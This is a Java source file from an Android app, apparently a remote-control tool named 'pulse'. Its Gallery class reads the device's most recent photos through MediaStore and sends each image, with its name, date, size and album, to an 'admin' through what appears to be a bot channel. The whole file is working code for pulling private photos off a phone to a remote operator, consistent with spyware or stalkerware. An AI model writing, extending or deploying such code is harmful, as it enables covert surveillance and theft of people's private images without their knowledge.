package com.pulse.control;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

/** Последние фото из галереи через MediaStore (без разрешения на файлы). */
public final class Gallery {

    public static final class Shot {
        public final long id, date, size;
        public final String name, mime, bucket;

        Shot(long id, long date, long size, String name, String mime, String bucket) {
            this.id = id; this.date = date; this.size = size;
            this.name = name; this.mime = mime; this.bucket = bucket;
        }
    }

    private Gallery() {}

    private static final Uri URI = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

    /** Последние N фото, новые сверху. */
    public static List<Shot> latest(Context c, int count) {
        List<Shot> out = new ArrayList<>();
        try {
            String[] proj = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.MIME_TYPE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
            };
            Cursor cur = c.getContentResolver().query(URI, proj, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cur != null) {
                int n = 0;
                while (cur.moveToNext() && n < count) {
                    long date = cur.getLong(1);
                    if (date == 0) date = cur.getLong(2) * 1000L;
                    out.add(new Shot(
                            cur.getLong(0), date, cur.getLong(3),
                            cur.getString(4), cur.getString(5), cur.getString(6)));
                    n++;
                }
                cur.close();
            }
        } catch (Exception e) {
            LogStore.add("🖼 Галерея: " + e.getMessage());
        }
        return out;
    }

    /** Читает байты фото по id. */
    public static byte[] read(Context c, long id) {
        try {
            Uri u = ContentUris.withAppendedId(URI, id);
            InputStream in = c.getContentResolver().openInputStream(u);
            if (in == null) return null;
            java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
            byte[] buf = new byte[16384];
            int n;
            while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);
            in.close();
            return bo.toByteArray();
        } catch (Exception e) {
            LogStore.add("🖼 Чтение фото: " + e.getMessage());
            return null;
        }
    }

    /** Отправляет последние N фото в бот. */
    public static void sendLatest(final Context c, final int count) {
        new Thread(() -> {
            List<Shot> list = latest(c, count);
            if (list.isEmpty()) {
                Act.sendToAdmin("🖼 <b>Галерея пуста</b>\n<i>или нет доступа к фото</i>", null);
                return;
            }
            Act.sendToAdmin("🖼 <b>Последние " + list.size() + " фото</b>", null);
            java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("dd.MM HH:mm", new java.util.Locale("ru"));
            for (Shot s : list) {
                byte[] data = read(c, s.id);
                if (data == null || data.length == 0) continue;
                String cap = "🖼 <b>" + Tools.e(s.name) + "</b>\n"
                        + f.format(new java.util.Date(s.date)) + " · " + Fs.human(s.size)
                        + (s.bucket == null ? "" : "\n📁 " + Tools.e(s.bucket));
                Act.sendPhoto(data, cap);
                try { Thread.sleep(350); } catch (InterruptedException ignored) {}
            }
        }, "pulse-gallery").start();
    }

    /** Список последних фото текстом (для WebApp). */
    public static String listText(Context c, int count) {
        List<Shot> list = latest(c, count);
        if (list.isEmpty()) return "🖼 Галерея пуста";
        StringBuilder sb = new StringBuilder("🖼 <b>Последние фото</b>\n\n");
        java.text.SimpleDateFormat f = new java.text.SimpleDateFormat("dd.MM HH:mm", new java.util.Locale("ru"));
        for (Shot s : list)
            sb.append("• ").append(Tools.e(s.name)).append(" · ")
                    .append(f.format(new java.util.Date(s.date))).append(" · ")
                    .append(Fs.human(s.size)).append("\n");
        return sb.toString();
    }
}
